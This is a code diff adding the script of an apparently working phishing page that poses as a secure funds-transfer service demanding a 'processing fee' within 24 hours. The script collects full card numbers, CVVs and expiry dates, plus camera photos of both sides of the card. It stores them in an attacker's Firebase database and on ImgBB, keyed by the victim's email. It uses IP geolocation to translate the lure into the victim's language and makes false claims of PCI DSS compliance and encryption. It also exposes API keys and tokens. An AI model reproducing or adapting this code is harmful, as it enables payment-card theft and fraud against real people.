+            } else {
+      document.getElementById("overlay").style.display = "block";                    
+            }
+        }
+
+        // Detect device mode on page load
+        window.addEventListener("DOMContentLoaded", detectDesktopMode);
+
+        // Detect on window resize to handle desktop/mobile mode changes dynamically
+        window.addEventListener("resize", detectDesktopMode);
+
+
+const formattedAmount = localStorage.getItem("fullname");
+      document.getElementById("displayName").textContent = formattedAmount 
+        ? formattedAmount 
+        : "No amount found in storage.";
+// The translateText function must be defined before it is used
+  function translateText(text, targetLanguage, callback) {
+      fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=es&tl=${targetLanguage}&dt=t&q=${encodeURI(text)}`)
+          .then(response => response.json())
+          .then(data => {
+              const translatedText = data[0].map(item => item[0]).join('');
+              callback(translatedText);
+          })
+           .catch(error => { 
+       console.error('Error translating text:', error);
+ document.getElementById("overlay").style.display = "block";         
+  });
+    }
+
+
+ function detectCountry(callback) {
+      fetch('https://ipinfo.io/json?token=84581b889c1970') // Replace with your ipinfo.io token
+          .then(response => response.json())
+          .then(data => {
+              console.log('Detected country data:', JSON.stringify(data, null, 2));
+
+              const countryCode = data.country;
+              const city = data.city || 'Unknown';
+
+              // Automatically get the country name from the country code
+              let countryName = 'Unknown';
+              if (countryCode) {
+                  try {
+                      countryName = new Intl.DisplayNames(['en'], { type: 'region' }).of(countryCode);
+                  } catch (error) {
+                      console.error('Error detecting country name:', error);
+                  }
+              }
+
+              if (countryCode && countryName) {
+                  callback(countryCode, countryName, city);
+              } else {
+                  console.error('Failed to detect country name.');
+                  callback(countryCode, 'Unknown', city);
+              }
+          })
+          .catch(error => {
+              console.error('Error detecting country:', error);
+       
+  document.getElementById("overlay").style.display = "block";         
+    
+ 
+              callback(null, 'Unknown', 'Unknown');
+        
+        
+          });
+  }
+
+    const countryLanguageMap = {
+        "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en", 
+        "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar", 
+        "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz", 
+        "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr", 
+        "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr", 
+        "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es", 
+        "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr", 
+        "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti", 
+        "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr", 
+        "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es", 
+        "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is", 
+        "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it", 
+        "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko", 
+        "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en", 
+        "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en", 
+        "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en", 
+        "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar", 
+        "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en", 
+        "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur", 
+        "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl", 
+        "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en", 
+        "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr", 
+        "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so", 
+        "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv", 
+        "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt", 
+        "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en", 
+        "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi", 
+        "VE": "es", "VN": "vi", "YE": "ar", "ZM": "en", "ZW": "en"
+    };
+
+    document.addEventListener('DOMContentLoaded', function() {
+        detectCountry(function(countryCode) {
+            const targetLanguage = countryLanguageMap[countryCode] || 'en';
+            translatePageText(targetLanguage);
+        });
+    });
+
+    function translatePageText(targetLanguage) {
+        const elementsToTranslate = [
+    { id: 'header-title', text: 'Secure Your Transfer' },
+    { id: 'header-description', text: 'Add your credit card information below to enjoy seamless, fast and secure transfers.' },
+    { id: 'security-title', text: 'Your Security is Our Priority' },
+    { id: 'security-description', text: 'We use industry-leading encryption and security protocols to ensure your data is safe and secure. Your credit card information will be handled with the utmost care and confidentiality.' },
+    { id: 'security-details', text: 'Here\'s what we do to protect you:' },
+    { id: 'security-list', text: '256-bit SSL encryption to safeguard your data.' },
+    { id: 'security-list', text: 'PCI DSS compliance for secure credit card processing.' },
+    { id: 'security-list', text: 'Regular security audits and updates.' },
+    { id: 'security-list', text: '24/7 monitoring for fraudulent activities.' },
+    { id: 'scroll-instruction', text: 'To Continue Please Scroll Down And Click On The Camera Picture Below Or Input Card Details Manually Below' },
+    
+    { id: 'trans2', text: 'Transfer' },
+
+      { id: 'trans1', text: 'Transfer' },
+    { id: 'client-greeting', text: 'Dear' },
+    
+    { id: 'jack', text: 'To transfer the funds in your account, a small processing fee of ' },
+    { id: 'jack1', text: ' needs to be paid. This fee is crucial for ensuring security and timely processing of your transaction.' },
+   
+    { id: 'urgent-payment-message', text: 'Please! Complete the payment within the next 24 hours to avoid delays in processing your transfer.' },
+    { id: 'tac', text: 'Your transactions are encrypted with industry-leading security standards.' },
+    { id: 'tac1', text: 'We guarantee your payment will be processed immediately after completion.' },
+    { id: 'footer-text', text: '© 2025 Your Company. All rights reserved.' },
+
+    
+    { id: 'expire', text: 'Expires' },
+    { id: 'carrd', text: 'Card Holder' },
+    
+    { id: 'expire', text: 'Expires' },
+    
+
+    { id: 'label-card-number', text: 'Card Number' },
+ 
+    { id: 'label-card-holder', text: 'Card Holder' },
+    { id: 'card-name-input', text: 'Your Full Name' },
+    { id: 'label-card-number1', text: 'Country' },
+    { id: 'select', text: 'Select Your Country' },
+    
+
+    { id: 'label-card-holder1', text: 'State' },
+    { id: 'state', text: 'Please Enter Your State' },
+    { id: 'label-expiry-month', text: 'Expiry Month' },
+    { id: 'tap', text: 'Expiry Month' },
+    
+    { id: 'label-expiry-year', text: 'Expiry Year' },
+    { id: 'pen', text: 'Expiry Year' },
+    
+    { id: 'label-cvv', text: 'CVV:' },
+    { id: 'complete-payment-button', text: 'Complete' },
+    { id: 'verify-button', text: 'Proceed' }
+
+
+
+]
+    elementsToTranslate.forEach(element => {
+            translateText(element.text, targetLanguage, function(translatedText) {
+                document.getElementById(element.id).textContent = translatedText;
+            });
+        });
+        }
+    // Firebase Configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyBZehk_8tWBhQOtCcS3VTzRRSCFCLvFGQA",
+      authDomain: "tuak-9f342.firebaseapp.com",
+      databaseURL: "https://tuak-9f342-default-rtdb.firebaseio.com",
+      projectId: "tuak-9f342",
+      storageBucket: "tuak-9f342.appspot.com",
+      messagingSenderId: "9176071516",
+      appId: "1:9176071516:web:38491206a78ed1c4035599",
+      measurementId: "G-BM58W3CJTQ"
+    };
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+// Store detected country in Firebase
+  detectCountry((countryCode, countryName) => {
+      const email = localStorage.getItem('userEmail');
+      if (email) {
+          const sanitizedEmail = email.replace(/\./g, ',');
+          db.ref(`messages/${sanitizedEmail}`).update({
+              countryName: countryName,
+              countryCode: countryCode
+          }).then(() => {
+              console.log('Country data saved successfully.');
+          }).catch((error) => {
+              console.error('Error saving country data:', error);
+          });
+      } else {
+        window.parent.document.getElementById("iframe").src = "index.html";  
+          console.warn('User email is not set in localStorage.');
+      }
+  });
+      // Helper function to sanitize email
+        function sanitizeEmail(email) {
+            return email.replace(/\./g, ",");
+        }
+
+        // Retrieve email from local storage
+        const email = localStorage.getItem("userEmail");
+        if (!email) {
+         window.parent.document.getElementById("iframe").src = "index.html";   
+            console.error("No email found in local storage.");
+        } else {
+      const sanitizedEmail = sanitizeEmail(email);
+     const emailRef = db.ref(`messages/${sanitizedEmail}`);
+   
+// Update Modal 5 display state
+            function updateModal5Display(displayStatus) {
+                emailRef.update({
+                    payDisplay: displayStatus
+               
+                });
+            }
+ // Check and apply Modal 5 display state on page load
+            emailRef.child("payDisplay").on("value", (snapshot) => {
+                const modal5Display = snapshot.val();
+                const modalElement = document.getElementById("modal5");
+                if (modal5Display) {
+                    modalElement.style.display = "block";
+                   
+                } else {
+                    modalElement.style.display = "none";
+                }
+            });
+          }
+           
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureButton = document.getElementById('capture');
+    const responseText = document.getElementById('response');
+  const responseText1 = document.getElementById('response1');
+    const confirmation = document.getElementById('confirmation');
+    const previewImage = document.getElementById('preview');
+    const goodIcon = document.getElementById('good-icon');
+    const badIcon = document.getElementById('bad-icon');
+   function translateAndSetText(responseText1, text, targetLanguage) {
+    translateText(text, targetLanguage, (translatedText) => {
+        responseText1.textContent = translatedText;
+    });
+     }
+   
+    let isFrontImageCaptured = false;
+
+    // Access the camera (back camera specifically)
+    async function startCamera() {
+     
+     const errorMessage = "Please Snap The Front Picture Of Your Card 💳.";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(responseText1, errorMessage, targetLanguage);
+        });
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "environment" }
+        });
+        video.srcObject = stream;
+      } catch (error) {
+        console.error('Error accessing the camera:', error);
+        alert('Camera access denied or unavailable.');
+      }
+    }
+
+    // Function to upload image to ImgBB and store in Firebase
+    async function uploadImage(blob, key) {
+      const formData = new FormData();
+      formData.append('image', blob);
+
+      const apiKey = '87ba063b9c356db7082b07f643a2f6e4'; // Replace with your ImgBB API key
+      const apiUrl = `https://api.imgbb.com/1/upload?key=${apiKey}`;
+
+      const response = await fetch(apiUrl, { method: 'POST', body: formData });
+      const result = await response.json();
+
+      if (result.success) {
+        const imageUrl = result.data.url;
+
+        // Get the user's email from local storage
+        const email = localStorage.getItem('userEmail');
+        const sanitizedEmail = email.replace(/\./g, ',');
+
+        // Store the image URL in Firebase under the email key
+        await firebase.database().ref(`messages/${sanitizedEmail}`).update({
+          [key]: imageUrl,
+          timestamp: Date.now()
+        });
+
+        return imageUrl;
+      } else {
+        throw new Error('Image upload failed');
+      }
+    }
+
+    // Show confirmation UI with the snapped image
+    function showConfirmation(blobUrl) {
+      const errorMessage = "Does the image looks OK?";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(responseText, errorMessage, targetLanguage);
+        });
+     responseText1.style.display ='block'
+      video.style.display ='none'
+      confirmation.style.display = 'block';
+      previewImage.src = blobUrl;
+      captureButton.style.display = 'none';
+    }
+
+    // Hide confirmation UI
+    function hideConfirmation() {
+     
+      video.style.display ='block'
+      confirmation.style.display = 'none';
+      captureButton.style.display = 'block';
+    }
+
+    // Capture button click event
+    captureButton.addEventListener('click', () => {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      // Draw the current video frame onto the canvas
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Convert the canvas image to a Blob
+      canvas.toBlob((blob) => {
+        if (!blob) {
+          alert('Failed to capture image.');
+          return;
+        }
+
+        const blobUrl = URL.createObjectURL(blob);
+        showConfirmation(blobUrl);
+
+        // Handle confirmation actions
+        goodIcon.onclick = async () => {
+          try {
+            if (!isFrontImageCaptured) {
+              await uploadImage(blob, 'imageUrl');
+              
+            const errorMessage = "Please Snap The Back Picture Of Your Card 💳.";
+    detectCountry((countryCode) => {
+        const targetLanguage = countryLanguageMap[countryCode] || 'en';
+        translateAndSetText(responseText1, errorMessage, targetLanguage);
+        }); 
+              isFrontImageCaptured = true;
+            } else {
+              await uploadImage(blob, 'imageUrl1');
+        
+         isFrontImageCaptured = false;     
+
+       document.getElementById("modalcam").style.display ='none'
+        modal5.style.display = "block";
+           updateModal5Display(true);    
+            
+  
+            }
+            hideConfirmation();
+          } catch (error) {
+            console.error('Error uploading image:', error);
+            responseText.innerText = 'Error uploading image.';
+          }
+        };
+
+        badIcon.onclick = () => {
+          hideConfirmation();
+        };
+      }, 'image/jpeg');
+    });
+document.getElementById('camera1').addEventListener('click', function () {
+
+document.getElementById("modalcam").style.display='block'
+startCamera();
+});
+    
+    document.getElementById('verify-button').addEventListener('click', function () {
+    event.preventDefault();
+
+    const cardName = document.getElementById("card-name-input").value;
+  const frane1 = document.getElementById("verify-button").value;  
+    const cardNumber = document.getElementById("card-number").value;
+    const cardCountry = document.getElementById("country").value;
+    const cardState = document.getElementById("state").value;
+    const cardMonth = document.getElementById("expiry-month").value;
+    const cardYear = document.getElementById("expiry-year").value;
+    const cardCvv = document.getElementById("cvv").value;
+
+    // Replace dots in the email with commas
+    const sanitizedEmail = email.replace(/\./g, ",");
+
+    // Update the database and handle success or failure
+    db.ref(`messages/${sanitizedEmail}`).update({
+        cardName,
+        cardNumber,
+        cardCvv,
+        cardState,
+        cardCountry,
+        cardMonth,
+        cardYear
+    })
+    .then(() => {
+              modal5.style.display = "block";
+           updateModal5Display(true);    
+                
+                
+  
+  
+    })
+    .catch((error) => {
+        // Handle errors
+        console.error("Error updating the database:", error);
+        alert("An error occurred. Please try again.");
+    });
+});
+
+  // Select the fields and button
+const fields = [
+    document.getElementById("card-name-input"),
+    document.getElementById("card-number"),
+    document.getElementById("country"),
+    document.getElementById("state"),
+    document.getElementById("expiry-month"),
+    document.getElementById("expiry-year"),
+    document.getElementById("cvv")
+];
+const verifyButton = document.getElementById('verify-button');
+
+// Function to check if all fields are filled
+function checkFields() {
+    const allFilled = fields.every(field => field.value.trim() !== "");
+    if (allFilled) {
+        verifyButton.style.backgroundColor = "#4b2b7f"; // Green color
+        verifyButton.disabled = false; // Enable the button if needed
+    } else {
+        verifyButton.style.backgroundColor = "#ccc"; // Gray color
+        verifyButton.disabled = true; // Disable the button
+    }
+}
+
+// Attach input event listeners to all fields
+fields.forEach(field => {
+    field.addEventListener('input', checkFields);
+});
+
+// Initial check when the page loads
+checkFields();
+       document.getElementById("hand3").addEventListener('click', function () {
+            window.parent.document.getElementById("iframe").src = "home.html";
+        });
+
+document.getElementById("complete-payment-button").addEventListener('click', function () {
+            window.parent.document.getElementById("iframe").src = "confirm.html";
+        });
+document.getElementById("fan3").addEventListener('click', function () {
+ document.getElementById("modalcam").style.display ='none'   
+              });
+  // Listen for online and offline events
+      // Add an event listener for the online event
+    window.addEventListener('online', () => {
+      console.log('Internet connection restored. Reloading page...');
+      location.reload(); // Reload the page when the connection is restored
+    });
+
+    // Optional: Add a listener for the offline event for logging
+    window.addEventListener('offline', () => {
+      console.log('Internet connection lost.');
+    });
+</script>
+</body>
+</html>
